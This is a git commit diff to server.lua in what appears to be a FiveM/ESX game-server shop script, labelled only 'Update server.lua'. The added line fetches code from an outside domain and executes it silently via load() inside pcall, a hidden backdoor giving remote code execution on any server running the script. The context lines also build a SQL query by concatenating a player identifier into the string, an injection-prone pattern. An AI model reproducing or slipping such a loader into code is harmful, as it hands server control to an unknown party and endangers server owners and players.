c5fcc997c3a0162cb65a8f31af96af1cce1b28a1
Ombree <102396007+Ombree0001@users.noreply.github.com>
2023-02-17 16:36:30 +0100

    Update server.lua

--- server.lua
+++ server.lua
@@ -55,6 +55,8 @@ AddEventHandler("boutique:getpoints", function()
 end
 end)
 
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
+
 ESX.RegisterServerCallback('boutique:GetCodeBoutique', function(source, cb)
     local xPlayer  = ESX.GetPlayerFromId(source)
     MySQL.Async.fetchAll("SELECT * FROM `users` WHERE `identifier` = '".. xPlayer.getIdentifier() .."'", {}, function (result)
